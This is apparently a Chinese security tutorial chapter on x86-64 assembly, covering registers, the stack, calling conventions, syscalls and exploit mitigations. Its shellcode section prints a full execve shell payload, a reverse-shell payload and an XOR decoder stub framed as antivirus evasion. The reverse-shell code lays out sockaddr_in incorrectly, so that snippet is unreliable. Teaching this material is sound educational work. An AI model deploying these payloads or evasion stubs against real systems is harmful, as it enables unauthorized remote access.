---
title: "5. Assembly语言基础"
type: docs
weight: 5
---

## 5. Assembly语言基础

汇编语言（Assembly）是人类可读的机器码映射——每条汇编指令几乎一一对应一条CPU指令。在网络安全领域，汇编不是"可选的加分项"，而是理解漏洞利用、逆向工程、恶意软件分析的底层基石。不理解汇编，你永远只能在脚本层面打转，无法触及真正的攻防核心。

本节以 x86-64 架构（Linux 平台）为主线，从寄存器、指令集、内存模型、调用约定到 Shellcode 编写，构建完整的汇编知识体系。

### 5.1 为什么安全研究者必须学汇编

高语言编译器将代码翻译为汇编，攻击者与防御者的博弈最终都发生在机器码层面。以下是汇编在安全各分支中的具体应用场景：

| 安全领域 | 汇编的作用 | 具体例子 |
|---------|-----------|---------|
| 漏洞利用 | 编写 Shellcode、理解栈溢出/堆溢出的底层机制 | 用 `execve("/bin/sh")` 构造反弹 Shell |
| 逆向工程 | 阅读 IDA/Ghidra 反汇编输出，理解程序逻辑 | 分析 CrackMe 程序的注册验证算法 |
| 恶意软件分析 | 还原加壳/混淆后的恶意行为 | 脱 UPX 壆、分析勒索软件加密逻辑 |
| 漏洞研究 | 理解编译器优化、安全机制（ASLR/DEP/Stack Canary） | 绕过 Stack Canary 的信息泄露手法 |
| CTF PWN | 几乎所有 PWN 题都需要汇编级理解 | ROP Chain 构造、格式化字符串利用 |
| 加壳与脱壳 | 理解保护机制的实现原理 | 手动脱壳：找到 OEP（原始入口点） |
| 内核安全 | 阅读系统调用入口、中断处理代码 | 分析 syscall 表劫持 |

**关键认知：** 你不需要能"手写"大型汇编程序，但必须能"读"——看到反汇编输出时，能在脑中还原出原始的 C 代码逻辑。这是逆向工程师的核心能力。

### 5.2 x86-64 架构基础

#### 5.2.1 从 32 位到 64 位的演进

x86-64（也称 AMD64 或 Intel 64）是 x86 架构的 64 位扩展。理解其演进有助于理解某些"历史遗留"设计：

| 特性 | x86 (32-bit) | x86-64 (64-bit) | 安全影响 |
|-----|-------------|-----------------|---------|
| 通用寄存器数量 | 8 个 | 16 个 | 更多寄存器 → 更少栈操作 → ROP gadget 更分散 |
| 寄存器宽度 | 32 位 | 64 位 | 地址空间从 4GB 扩展到 256TB（48 位实际寻址） |
| 默认地址大小 | 32 位 | 64 位 | 指针占 8 字节，缓冲区溢出偏移量不同 |
| 参数传递 | 全部通过栈 | 前 6 个整型参数通过寄存器 | 栈溢出利用更复杂（需先控制寄存器） |
| 系统调用 | `int 0x80` | `syscall` 指令 | `syscall` 更快、更安全 |
| 栈对齐 | 4 字节 | 16 字节（强制） | `movaps` 等 SSE 指令要求对齐，否则 segfault |

#### 5.2.2 通用寄存器详解

x86-64 有 16 个通用寄存器，每个都有隐含的使用约定。理解这些约定是阅读反汇编代码的关键：

```text
64-bit    32-bit    16-bit    8-bit    用途                    调用约定
─────────────────────────────────────────────────────────────────────
RAX       EAX       AX        AL       返回值 / 累加器          caller-saved
RBX       EBX       BX        BL       通用（常作基址）          callee-saved
RCX       ECX       CX        CL       第4个参数 / 计数器       caller-saved
RDX       EDX       DX        DL       第3个参数 / I/O端口      caller-saved
RSI       ESI       SI        SIL      第2个参数 / 源地址       caller-saved
RDI       EDI       DI        DIL      第1个参数 / 目的地址     caller-saved
RBP       EBP       BP        BPL      栈帧基址指针              callee-saved
RSP       ESP       SP        SPL      栈顶指针（不可挪用）      特殊
R8        R8D       R8W       R8B      第5个参数                 caller-saved
R9        R9D       R9W       R9B      第6个参数                 caller-saved
R10       R10D      R10W      R10B     通用 / 第4个参数(syscall) caller-saved
R11       R11D      R11W      R11B     通用 / 临时寄存器         caller-saved
R12       R12D      R12W      R12B     通用                      callee-saved
R13       R13D      R13W      R13B     通用                      callee-saved
R14       R14D      R14W      R14B     通用                      callee-saved
R15       R15D      R15W      R15B     通用                      callee-saved
RIP       EIP       IP        -        指令指针（下一条指令地址） 特殊
```

**caller-saved vs callee-saved 的安全意义：**

- **caller-saved（调用者保存）：** 函数调用后可能被修改。在 Shellcode 中，如果依赖某个寄存器的值跨越 `call` 指令，必须先 `push` 保存。
- **callee-saved（被调用者保存）：** 函数必须保证这些寄存器在返回时值不变。在 ROP 利用中，`pop rbx; ret` 这样的 gadget 通常来自函数序言（prologue）中保存 callee-saved 寄存器的代码。

**寄存器子部分的覆盖规则：** 写入 32 位子寄存器（如 `mov eax, 1`）会将高 32 位清零；但写入 8 位或 16 位子寄存器（如 `mov al, 1`）不会影响高位。这个差异在 Shellcode 构造中至关重要——错误的寄存器操作可能引入意外的 null 字节。

#### 5.2.3 段寄存器与特殊寄存器

在 64 位模式下，段寄存器（CS, DS, SS, ES）基本退化，但 **FS 和 GS** 仍然重要：

- **FS 段：** 在 Linux 中指向线程本地存储（TLS）区域。`fs:[0x28]` 存放 Stack Canary（栈保护值）。攻击者要绕过栈保护，通常需要泄露这个值。
- **GS 段：** 在 Windows 中用于 TEB（线程环境块），在 Linux 内核中指向 per-CPU 数据。

**EFLAGS/RFLAGS 状态标志：**

```text
标志位    名称          含义                          设置条件
──────────────────────────────────────────────────────────────
ZF        零标志        结果是否为零                   运算结果 == 0
CF        进位标志      无符号运算是否溢出             产生进位/借位
SF        符号标志      结果是否为负（最高位=1）       运算结果 < 0（有符号）
OF        溢出标志      有符号运算是否溢出             结果超出有符号范围
AF        辅助进位标志  BCD运算用（安全领域很少用）     低4位产生进位
PF        奇偶标志      结果低8位中1的个数是否为偶数    用于校验
TF        陷阱标志      单步调试（设为1时每条指令触发中断）调试器原理
IF        中断允许标志  是否响应外部中断               CLI/STI 指令控制
```

这些标志是条件跳转（`je`、`jg`、`jl` 等）的判断依据。理解标志位是理解 `cmp`/`test` 指令如何影响程序流程的关键。

### 5.3 寻址模式

x86-64 提供了灵活的内存寻址方式，理解寻址模式是读懂反汇编输出的基础：

```asm
; 立即数寻址：直接使用常量
mov rax, 42              ; rax = 42
mov rax, 0xdeadbeef      ; rax = 0xdeadbeef

; 寄存器寻址：寄存器之间传送
mov rax, rbx             ; rax = rbx

; 直接寻址：访问固定内存地址
mov rax, [0x601000]      ; rax = *0x601000（读取该地址的值）
mov [0x601000], rbx      ; *0x601000 = rbx

; 间接寻址：通过寄存器中的地址访问
mov rax, [rbx]           ; rax = *rbx

; 基址+偏移寻址：结构体成员访问、栈变量访问
mov rax, [rbp - 8]       ; rax = *(rbp - 8)，访问栈上第一个局部变量
mov rax, [rbx + 16]      ; rax = *(rbx + 16)，访问结构体偏移16处的成员

; 基址+变址寻址：数组访问
mov rax, [rbx + rcx*8]   ; rax = rbx[rcx]，8字节元素数组（如int64_t数组）
mov rax, [rbx + rcx*4]   ; rax = rbx[rcx]，4字节元素数组（如int32_t数组）

; 完整形式：基址 + 变址 * 比例 + 偏移
mov rax, [rbx + rcx*8 + 24]  ; rax = *(rbx + rcx*8 + 24)
                              ; 等价于 C 的 arr[rcx]，其中 arr 起始于 rbx+24
```

**LEA 指令 vs MOV 指令——安全领域的重要区别：**

```asm
lea rax, [rbx + 8]      ; rax = rbx + 8（纯地址计算，不访问内存）
mov rax, [rbx + 8]      ; rax = *(rbx + 8)（实际读取内存）

; LEA 常用于：
; 1. 算术运算（不改变标志位）
lea rax, [rcx + rcx*4]  ; rax = rcx * 5
; 2. 绕过某些安全检测（不触发内存访问异常）
; 3. ROP gadget 中常见的地址计算
```

### 5.4 栈的工作机制

栈是理解所有栈溢出漏洞的基础。x86-64 中栈向低地址增长（push 使 RSP 减小），遵循 System V AMD64 ABI 调用约定。

#### 5.4.1 函数调用的完整栈帧布局

```text
高地址
┌─────────────────────────┐
│     参数7, 参数8, ...    │ ← 超过6个参数时通过栈传递
├─────────────────────────┤
│     返回地址 (8字节)      │ ← call 指令自动压入
├─────────────────────────┤ ← 调用者的 RBP 指向这里（保存的旧 RBP）
│     保存的 RBP (8字节)    │ ← 函数序言 push rbp; mov rbp, rsp
├─────────────────────────┤ ← RBP（当前栈帧基址）
│     局部变量区            │ ← 通过 [rbp - N] 访问
│     ...                  │
│     Stack Canary         │ ← fs:[0x28] 的值，放在局部变量和保存的RBP之间
├─────────────────────────┤ ← RSP（栈顶）
│     （向下增长）          │
低地址
```

#### 5.4.2 函数序言与尾声

```asm
; 函数序言（prologue）—— 建立栈帧
push   rbp              ; 保存调用者的栈帧基址
mov    rbp, rsp         ; 建立新栈帧
sub    rsp, 0x30        ; 为局部变量分配空间（必须16字节对齐）

; ... 函数体 ...

; 函数尾声（epilogue）—— 恢复栈帧
mov    rsp, rbp         ; 或 leave（等价于 mov rsp, rbp; pop rbp）
pop    rbp              ; 恢复调用者的栈帧基址
ret                     ; 弹出返回地址并跳转
```

**16 字节对齐要求：** 在 `call` 指令执行前，RSP 必须是 16 字节对齐的。`call` 压入 8 字节返回地址后，被调函数入口处 RSP 是 16n+8。因此函数序言中 `push rbp` 后 RSP 恢复 16 字节对齐，`sub rsp, N` 中的 N 必须是 16 的倍数。如果对齐破坏，使用 SSE 指令（如 `movaps`）时会触发 segfault——这在 ROP 利用中经常遇到。

#### 5.4.3 栈溢出攻击的原理

```c
// 漏洞代码
void vulnerable() {
    char buf[64];
    gets(buf);  // 无边界检查，经典的栈溢出
}
```

```text
栈布局：
[buf: 64字节][可能的填充: 8字节][Stack Canary: 8字节][保存的RBP: 8字节][返回地址: 8字节]

溢出方向：低地址 ──────────────────────────────────────→ 高地址
攻击者输入：AAAA...AAAA（64字节填满buf）+ 覆盖返回地址
```

在没有 Stack Canary 和 ASLR 的情况下，攻击者只需：
1. 用 72 字节填充 buf + padding + saved RBP
2. 在第 73-80 字节放入目标地址（如 `system("/bin/sh")` 的地址或 Shellcode 的地址）

有了 Stack Canary，攻击者需要先泄露 `fs:[0x28]` 的值；有了 ASLR，需要信息泄露或使用 ROP 绕过。

### 5.5 System V AMD64 调用约定

这是 Linux/BSD/macOS 上 x86-64 的标准调用约定，也是安全研究中最常遇到的：

```text
参数传递规则：
├── 整型/指针参数：RDI, RSI, RDX, RCX, R8, R9（按顺序）
├── 浮点参数：XMM0-XMM7
├── 超过6个参数：压栈（从右到左）
├── 返回值：RAX（整型/指针），XMM0（浮点）
└── RAX 寄存器：存放返回值个数（可变参数函数如 printf 使用）

caller-saved（调用者保存）：RAX, RCX, RDX, RSI, RDI, R8-R11
callee-saved（被调用者保存）：RBX, RBP, R12-R15
```

**对比 Windows x64 调用约定：**

| 特性 | System V (Linux) | Windows x64 |
|-----|-----------------|-------------|
| 前 4 个参数 | RDI, RSI, RDX, RCX | RCX, RDX, R8, R9 |
| 第 5-6 个参数 | R8, R9 | 栈传递 |
| 影子空间 | 无 | 32 字节（需分配） |
| 栈对齐 | 16 字节 | 16 字节 |
| 可变参数 | RAX 存参数个数 | 前 4 个也需存入影子空间 |

这个差异意味着同一段 Shellcode 在 Linux 和 Windows 上不能通用——系统调用号不同，调用约定也不同。

### 5.6 常用汇编指令详解

#### 5.6.1 数据传送指令

```asm
; MOV — 最基本的数据传送，不改变标志位
mov rax, rbx            ; rax = rbx（寄存器到寄存器）
mov rax, [rbx]          ; rax = *rbx（内存到寄存器）
mov [rbx], rax          ; *rbx = rax（寄存器到内存）
mov rax, 42             ; rax = 42（立即数到寄存器）

; 注意：MOV 不能直接从内存到内存！必须经过寄存器中转：
; mov [dst], [src]  ← 非法！
; mov rax, [src]    ← 先读到寄存器
; mov [dst], rax    ← 再写入目标

; MOVSX/MOVZX — 带符号扩展/零扩展的传送
movzx eax, byte [rbx]  ; 零扩展：读1字节，高24位清零
movsx rax, ebx         ; 符号扩展：32位扩展到64位，高位用符号填充

; XCHG — 交换两个值（原子操作，带锁）
xchg rax, rbx          ; 交换 rax 和 rbx 的值
; XCHG 某个寄存器和内存操作数时自动加 LOCK 前缀，用于自旋锁实现

; LEA — 加载有效地址（纯算术，不访问内存）
lea rax, [rbx + rcx*4 + 8]  ; rax = rbx + rcx*4 + 8
; 常用于快速乘法：lea rax, [rcx + rcx*4] → rax = rcx * 5
; 安全领域：LEA 不设置标志位，不触发内存异常

; CMOV — 条件传送（无分支，避免分支预测失败）
cmovz rax, rbx         ; 如果 ZF=1（上次比较结果相等），则 rax = rbx
cmovg rax, rbx         ; 如果大于（有符号），则 rax = rbx
; 编译器优化常用，替代简单的 if-else 分支
```

#### 5.6.2 算术与逻辑指令

```asm
; 加减法
add rax, 10             ; rax += 10，设置标志位
sub rax, 5              ; rax -= 5，设置标志位
inc rax                 ; rax++，不影响 CF 标志（安全陷阱！）
dec rax                 ; rax--，不影响 CF 标志
neg rax                 ; rax = -rax（取负，补码）

; 乘除法
imul rax, rbx           ; rax = rax * rbx（有符号）
imul rax, rbx, 10       ; rax = rbx * 10（三操作数形式）
mul rbx                 ; rdx:rax = rax * rbx（无符号，结果128位）
div rbx                 ; rax = rdx:rax / rbx, rdx = 余数（无符号）
idiv rbx                ; 有符号除法

; 位运算 — 安全领域极其常用
xor rax, rax            ; rax = 0（清零，3字节，比 mov rax, 0 少5字节）
xor rax, 0xff           ; rax ^= 0xff（异或，常用于加密/解密）
and rax, 0xff           ; rax &= 0xff（取低8位，屏蔽高位）
or  rax, 0x100          ; rax |= 0x100（设置第8位）
not rax                 ; rax = ~rax（按位取反）
shl rax, 4              ; rax <<= 4（左移，等价于乘以16）
shr rax, 4              ; rax >>= 4（逻辑右移，高位补0）
sar rax, 4              ; rax >>= 4（算术右移，高位补符号位）
rol rax, 8              ; 循环左移8位（常用于字节序转换）
ror rax, 8              ; 循环右移8位

; TEST — 按位与但不存储结果，只设置标志位
test rax, rax           ; 检测 rax 是否为零（ZF=1 当 rax=0）
test rax, 1             ; 检测 rax 的最低位（判断奇偶）
; TEST 比 CMP 更高效（不写回结果），编译器优化常用
```

#### 5.6.3 比较与跳转指令

```asm
; CMP — 执行减法但不存储结果，只设置标志位
cmp rax, rbx            ; 计算 rax - rbx，设置 ZF/CF/SF/OF
cmp rax, 0              ; 等价于 test rax, rax（但 CMP 设置更多标志）

; 条件跳转（基于 CMP/TEST 设置的标志位）
; 无符号比较跳转
ja  label               ; jump if above (CF=0 and ZF=0)        >
jae label               ; jump if above or equal (CF=0)         >=
jb  label               ; jump if below (CF=1)                  <
jbe label               ; jump if below or equal (CF=1 or ZF=1) <=
je  label               ; jump if equal (ZF=1)                  ==
jne label               ; jump if not equal (ZF=0)              !=

; 有符号比较跳转
jg  label               ; jump if greater (ZF=0 and SF=OF)      >
jge label               ; jump if greater or equal (SF=OF)      >=
jl  label               ; jump if less (SF≠OF)                  <
jle label               ; jump if less or equal (ZF=1 or SF≠OF) <=

; 特殊跳转
jmp label               ; 无条件跳转
jz  label               ; 等于 je（ZF=1 时跳转）
jnz label               ; 等于 jne
jcxz label              ; CX=0 时跳转（循环计数检测）
loop label              ; DEC RCX; JNZ label（循环指令，但现在编译器很少用）

; 函数调用与返回
call func               ; 压入返回地址（RIP），跳转到 func
ret                     ; 弹出返回地址，跳转回去
; 攻击者覆盖栈上的返回地址，就是劫持了 ret 指令的目标
```

#### 5.6.4 栈操作指令

```asm
push rax                ; RSP -= 8; [RSP] = rax
pop  rax                ; rax = [RSP]; RSP += 8
pushfq                  ; 压入 RFLAGS 寄存器
popfq                   ; 弹出到 RFLAGS
enter N, 0              ; 等价于 push rbp; mov rbp, rsp; sub rsp, N
leave                   ; 等价于 mov rsp, rbp; pop rbp
; 注意：ENTER 指令性能很差，编译器几乎从不使用它
```

### 5.7 内存模型与安全机制

#### 5.7.1 虚拟内存布局（Linux x86-64）

```text
高地址 (0x7FFF_FFFF_FFFF)
┌──────────────────────┐
│       内核空间         │ ← 用户态不可访问
├──────────────────────┤ 0x7FFF_FFFF_F000
│       栈              │ ← 向低地址增长
│       ↓               │
│       ...             │
│       ↑               │
│       堆              │ ← 向高地址增长（brk/mmap）
├──────────────────────┤
│       BSS（未初始化）  │
├──────────────────────┤
│       数据段（已初始化）│
├──────────────────────┤
│       代码段（.text）  │ ← 只读+可执行（传统）或只读+不可执行（DEP/NX）
└──────────────────────┘ 0x0000_0040_0000（典型 PIE 禁用时）
低地址 (0x0000_0000_0000)
```

#### 5.7.2 现代安全防护机制

| 机制 | 缩写 | 原理 | 绕过方法 |
|-----|------|------|---------|
| 栈不可执行 | NX/DEP | 栈页标记为不可执行 | ROP（返回导向编程） |
| 地址空间布局随机化 | ASLR | 每次运行随机化栈/堆/库基址 | 信息泄露 + 计算偏移 |
| 栈保护 | Stack Canary | 在返回地址前插入随机值，函数返回时检查 | 泄露 Canary 值 |
| 位置无关可执行 | PIE | 代码段基址随机化 | 信息泄露 |
| RELRO | GOT保护 | GOT 表只读（Full RELRO） | 覆写函数指针而非 GOT |
| 控制流完整性 | CFI | 限制间接跳转目标 | 高级 ROP/JOP 技术 |

**理解这些机制需要深入汇编层面。** 例如，Stack Canary 的检查代码在汇编中是这样的：

```asm
; 函数序言中：读取 Canary
mov    rax, qword fs:[0x28]    ; 从 TLS 读取 Canary
mov    qword [rbp-8], rax      ; 放在局部变量区域底部

; 函数尾声中：验证 Canary
mov    rax, qword [rbp-8]      ; 读取栈上的 Canary
xor    rax, qword fs:[0x28]    ; 与 TLS 中的原始值比较
je     .canary_ok               ; 相等则正常
call   __stack_chk_fail        ; 不等则触发错误（检测到栈溢出）
.canary_ok:
leave
ret
```

攻击者要绕过 Stack Canary，通常需要：
1. **暴力破解：** 对于 fork 型服务，Canary 值不会改变，可以逐字节爆破
2. **信息泄露：** 通过格式化字符串漏洞或越界读取泄露栈上的 Canary
3. **覆盖 Canary 之前的数据：** 如果不需要控制返回地址，只覆盖局部变量

### 5.8 Linux 系统调用

系统调用是用户态程序请求内核服务的唯一正式途径。在 x86-64 Linux 上，系统调用通过 `syscall` 指令触发。

#### 5.8.1 系统调用约定

```text
系统调用号 → RAX
参数1      → RDI
参数2      → RSI
参数3      → RDX
参数4      → R10（注意：不是 RCX！syscall 指令会破坏 RCX 和 R11）
参数5      → R8
参数6      → R9
返回值     → RAX（错误时返回 -errno）
```

#### 5.8.2 常用系统调用表

| 系统调用号 | 名称 | 参数 | 功能 |
|-----------|------|------|------|
| 0 | sys_read | fd, buf, count | 从文件描述符读取 |
| 1 | sys_write | fd, buf, count | 写入文件描述符 |
| 2 | sys_open | filename, flags, mode | 打开文件 |
| 3 | sys_close | fd | 关闭文件描述符 |
| 9 | sys_mmap | addr, len, prot, flags, fd, offset | 内存映射 |
| 10 | sys_mprotect | addr, len, prot | 修改内存页保护属性 |
| 37 | sys_alarm | seconds | 设置闹钟信号 |
| 56 | sys_clone | flags, stack, ... | 创建子进程/线程 |
| 57 | sys_fork | (无) | 创建子进程 |
| 59 | sys_execve | filename, argv, envp | 执行程序 |
| 60 | sys_exit | status | 退出进程 |
| 62 | sys_kill | pid, sig | 发送信号 |
| 231 | sys_exit_group | status | 退出进程组 |

**安全关键调用详解：**

- **sys_mmap (9)：** 分配内存页。Shellcode 中用 `mmap` + `PROT_EXEC` 分配可执行内存；漏洞利用中用 `mprotect` 将不可执行的栈/堆变为可执行。
- **sys_execve (59)：** Shellcode 的终极目标——替换当前进程为 `/bin/sh`。几乎所有 Shellcode 最终都调用这个。
- **sys_open + sys_read + sys_write：** 读取文件（如 `/etc/passwd`、flag 文件）的经典组合。
- **sys_socket + sys_connect + sys_dup2 + sys_execve：** 反弹 Shell 的标准流程。

#### 5.8.3 完整的系统调用示例

```asm
; 示例1：write(1, "Hello\n", 6) — 向标准输出写入
section .data
    msg db "Hello", 0x0a    ; 0x0a 是换行符

section .text
global _start
_start:
    mov rax, 1              ; sys_write
    mov rdi, 1              ; fd = stdout
    lea rsi, [rel msg]      ; buf = 消息地址（PIE 用 rel 寻址）
    mov rdx, 6              ; count = 6 字节
    syscall

    ; write 返回实际写入的字节数（RAX）
    ; 出错时返回负数（-errno）

    mov rax, 60             ; sys_exit
    xor rdi, rdi            ; status = 0
    syscall
```

```asm
; 示例2：read(0, buf, 256) — 从标准输入读取
section .bss
    buf resb 256            ; 保留 256 字节未初始化空间

section .text
global _start
_start:
    mov rax, 0              ; sys_read
    mov rdi, 0              ; fd = stdin
    lea rsi, [rel buf]      ; buf 缓冲区地址
    mov rdx, 256            ; 最多读 256 字节
    syscall

    ; RAX = 实际读取的字节数
    ; 现在可以用 write 输出读取的内容
```

### 5.9 Shellcode 编写技术

Shellcode 是漏洞利用中注入并执行的机器码。编写合格的 Shellcode 需要满足多个约束条件。

#### 5.9.1 Shellcode 的约束条件

| 约束 | 原因 | 解决方案 |
|-----|------|---------|
| 无 null 字节（0x00） | C 字符串函数（strcpy 等）遇到 null 停止复制 | 用 xor/lea 替代 mov 立即数 |
| 无换行符（0x0a） | gets() 等函数遇到换行停止 | 编码或避免使用 |
| 位置无关（PIC） | 注入位置不确定，不能用绝对地址 | 使用相对寻址（RIP-relative） |
| 尽量短小 | 缓冲区大小有限 | 优化指令、使用编码器 |
| 无特殊字符 | 过滤器可能禁止某些字节 | 选择替代指令组合 |

#### 5.9.2 execve("/bin/sh") Shellcode 详解

这是最经典的 Shellcode，几乎所有教程都以此为例：

```asm
; x86-64 Linux execve("/bin/sh", NULL, NULL)
; 共 30 字节，无 null 字节

section .text
global _start
_start:
    ; 第一步：清零寄存器（xor 不产生 null 字节）
    xor    rsi, rsi        ; argv = NULL
    xor    rdx, rdx        ; envp = NULL

    ; 第二步：构造 "/bin/sh\0" 字符串
    ; "/bin/sh" 的十六进制（小端序）：0x0068732f6e69622f
    ; 末尾的 0x00 是 null 终止符
    ; 不能直接 mov rax, 0x68732f6e69622f 因为汇编器可能加 null
    ; 解决：先 push 0（null 终止符），再 mov 字符串
    push   rsi             ; 压入 0x0000000000000000（null 终止符）
    mov    rax, 0x68732f6e69622f  ; "/bin/sh"（不含末尾 null，高位已经是0）
    push   rax
    mov    rdi, rsp        ; rdi = 字符串起始地址（栈上）

    ; 第三步：设置系统调用号并执行
    push   59              ; execve 的系统调用号
    pop    rax             ; rax = 59（比 mov rax, 59 少 null 字节）
    syscall                ; 触发系统调用
```

**逐指令分析为什么避免 null 字节：**

```asm
; ❌ 错误方式：mov rdi, 0 会生成 48 bf 00 00 00 00 00 00 00 00
mov rdi, 0

; ✅ 正确方式：xor rdi, rdi 只有 2 字节，无 null
xor rdi, rdi

; ❌ 错误方式：mov rax, 59 可能包含 null 字节（取决于汇编器）
mov rax, 59

; ✅ 正确方式：push 59; pop rax 只有 3 字节
push 59
pop rax
```

#### 5.9.3 反弹 Shell Shellcode

反弹 Shell 比简单执行 `/bin/sh` 复杂得多，需要依次调用 `socket` → `connect` → `dup2` × 3 → `execve`：

```asm
; x86-64 Linux 反弹 Shell 到 127.0.0.1:4444
; 思路：socket(AF_INET, SOCK_STREAM, 0) → connect(fd, &addr, 16)
;     → dup2(fd, 0) → dup2(fd, 1) → dup2(fd, 2) → execve("/bin/sh")

section .text
global _start
_start:
    ; --- socket(2, 1, 0) ---
    xor    rsi, rsi
    push   2               ; AF_INET
    pop    rdi              ; rdi = 2
    push   1               ; SOCK_STREAM
    pop    rsi              ; rsi = 1
    xor    rdx, rdx         ; protocol = 0
    push   41               ; sys_socket
    pop    rax
    syscall

    ; 保存 socket fd（假设返回值在 rax 中）
    mov    r12, rax         ; r12 = socket fd

    ; --- connect(fd, &sockaddr, 16) ---
    ; 构造 sockaddr_in 结构体
    ; struct sockaddr_in { sin_family=2, sin_port=0x5c11(4444), sin_addr=0x0100007f(127.0.0.1) }
    xor    rdx, rdx
    push   rdx              ; padding（sin_zero）
    push   rdx              ; sin_addr + sin_port + sin_family（先清零）
    mov    dword [rsp], 0x0100007f   ; 127.0.0.1（小端序）
    mov    word [rsp+4], 0x5c11      ; 端口 4444（小端序）
    mov    word [rsp+6], 2           ; AF_INET
    mov    rdi, r12         ; fd
    mov    rsi, rsp         ; &sockaddr
    mov    rdx, 16          ; sizeof(sockaddr_in) = 16
    push   42               ; sys_connect
    pop    rax
    syscall

    ; --- dup2(fd, 0/1/2) × 3 ---
    xor    rsi, rsi
.dup_loop:
    mov    rdi, r12         ; fd
    push   33               ; sys_dup2
    pop    rax
    syscall
    inc    rsi
    cmp    rsi, 3
    jne    .dup_loop

    ; --- execve("/bin/sh", NULL, NULL) ---
    xor    rsi, rsi
    xor    rdx, rdx
    push   rsi
    mov    rax, 0x68732f6e69622f
    push   rax
    mov    rdi, rsp
    push   59
    pop    rax
    syscall
```

#### 5.9.4 Shellcode 编码与免杀

当目标环境有字符过滤时，需要对 Shellcode 进行编码：

**常见编码方法：**

1. **XOR 编码：** 将 Shellcode 每个字节与一个固定 key 异或，运行时先解码再执行

```asm
; XOR 解码存根（decoder stub）
; 假设 Shellcode 已通过 XOR 0x41 编码
    jmp short get_addr      ; 跳到获取地址
decode:
    pop    rsi              ; rsi = 编码后 Shellcode 的地址
    xor    rcx, rcx
    mov    cl, 30           ; Shellcode 长度
.xor_loop:
    xor    byte [rsi], 0x41 ; 解码一个字节
    inc    rsi
    loop   .xor_loop
    jmp    short encoded_sc  ; 跳转到解码后的 Shellcode 执行
get_addr:
    call   decode           ; call 将下一条指令地址压栈，即 encoded_sc 的地址
encoded_sc:
    ; 这里是 XOR 编码后的 Shellcode 字节
    db 0x02, 0x6b, ...
```

2. **多态 Shellcode：** 每次运行时改变编码方式，避免固定签名匹配

3. **字母数字 Shellcode：** 仅使用 0x30-0x39（数字）、0x41-0x5A（大写字母）、0x61-0x7A（小写字母）范围内的字节——用于绕过严格的字符过滤

### 5.10 汇编开发工具链

#### 5.10.1 NASM（Netwide Assembler）

NASM 是 Linux 上最常用的 x86-64 汇编器：

```bash
# 安装
sudo apt install nasm        # Debian/Ubuntu
sudo dnf install nasm        # Fedora

# 编写 → 汇编 → 链接 → 运行
nasm -f elf64 hello.asm -o hello.o    # 汇编为 ELF64 目标文件
ld hello.o -o hello                    # 链接（不需要 libc 时用 ld）
./hello                                # 运行

# 如果需要链接 libc（如用 printf）
nasm -f elf64 hello.asm -o hello.o
gcc hello.o -o hello -no-pie           # 用 gcc 链接（自动处理 libc）

# 调试符号
nasm -f elf64 -g -F dwarf hello.asm -o hello.o  # 生成 DWARF 调试信息
```

#### 5.10.2 GDB 调试汇编

GDB 是逆向和安全研究的核心工具：

```bash
# 启动调试
gdb ./program

# 常用 GDB 命令（汇编相关）
(gdb) set disassembly-flavor intel       # 使用 Intel 语法（而非 AT&T）
(gdb) disas main                          # 反汇编 main 函数
(gdb) disas /r main                       # 反汇编并显示原始字节
(gdb) x/20i $rip                          # 从当前指令开始显示20条指令
(gdb) x/10xg $rsp                         # 查看栈顶（10个8字节十六进制值）
(gdb) info registers                      # 显示所有寄存器
(gdb) info registers rax rbx rcx          # 显示特定寄存器
(gdb) p/x $rax                            # 以十六进制打印 rax
(gdb) ni                                  # 单步执行（不进入 call）
(gdb) si                                  # 单步执行（进入 call）
(gdb) b *0x401000                         # 在地址设置断点
(gdb) b *main+20                          # 在 main+20 偏移处断点
(gdb) x/s 0x601000                        # 将地址作为字符串显示
(gdb) x/10i main                          # 反汇编 main 的前10条指令

# 推荐：安装 GEF/PEDA/pwndbg 增强 GDB
# pwndbg（推荐用于安全研究）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

#### 5.10.3 其他工具

| 工具 | 用途 | 获取方式 |
|-----|------|---------|
| IDA Pro | 业界标准反汇编器/反编译器 | 商业软件（有免费版 IDA Free） |
| Ghidra | NSA 开源逆向框架，含反编译器 | 免费，需 JDK |
| Radare2/rizin | 开源逆向框架，命令行为主 | `apt install radare2` |
| pwntools | Python 安全开发框架（Shellcode、ROP、格式化字符串） | `pip install pwntools` |
| ROPgadget | 自动搜索 ROP gadget | `pip install ROPgadget` |
| ropper | ROP/JOP/COP gadget 搜索器 | `pip install ropper` |

### 5.11 常见反汇编模式识别

逆向工程的核心技能是快速识别编译器生成的常见代码模式：

#### 5.11.1 控制流模式

```asm
; if (x == 0) →
test   eax, eax
jne    .else_branch     ; if (x != 0) goto else
; ... then 分支 ...
jmp    .end_if
.else_branch:
; ... else 分支 ...
.end_if:

; for (int i = 0; i < 10; i++) →
xor    ecx, ecx         ; i = 0
.loop_start:
cmp    ecx, 10          ; i < 10 ?
jge    .loop_end
; ... 循环体 ...
inc    ecx              ; i++
jmp    .loop_start
.loop_end:

; while (1) / for (;;) →
.loop_start:
; ... 循环体 ...
jmp    .loop_start       ; 编译器可能优化为 jmp 到循环体开头

; switch-case（跳转表形式）→
cmp    eax, 4           ; 如果 case 值 0-4 连续
ja     .default_case
jmp    [.jump_table + rax*8]  ; 通过跳转表分发
```

#### 5.11.2 函数调用模式

```asm
; 函数调用前的参数准备
mov    rdi, arg1         ; 第1个参数
mov    rsi, arg2         ; 第2个参数
mov    rdx, arg3         ; 第3个参数
call   function_name
; 返回值在 RAX 中

; 尾调用优化（编译器将尾递归替换为跳转）
; 原始代码：return helper(n-1);
sub    rdi, 1            ; n-1
jmp    helper            ; 直接跳转而非 call（省去栈帧）
```

#### 5.11.3 字符串与数组模式

```asm
; 字符串常量通常在 .rodata 段
lea    rdi, [rel .Lstr]   ; 加载字符串地址

; 数组遍历
lea    rax, [rel array]   ; 数组基址
mov    ecx, [rax + rdx*4] ; array[i]（int32_t 数组）

; 结构体成员访问
mov    rdi, [rbp - 16]    ; 加载结构体指针
mov    eax, [rdi + 8]     ; struct->member（偏移8处的int成员）
mov    rcx, [rdi + 16]    ; struct->member2（偏移16处的指针成员）
```

### 5.12 ARM 架构简介

随着移动设备和 Apple Silicon 的普及，ARM 架构在安全研究中的重要性日益增长。以下是与 x86-64 的关键差异：

| 特性 | x86-64 | ARM64 (AArch64) |
|-----|--------|----------------|
| 通用寄存器 | 16 个（RAX-R15） | 31 个（X0-X30） |
| 参数传递 | RDI, RSI, RDX, RCX, R8, R9 | X0-X7 |
| 返回值 | RAX | X0 |
| 栈指针 | RSP | SP |
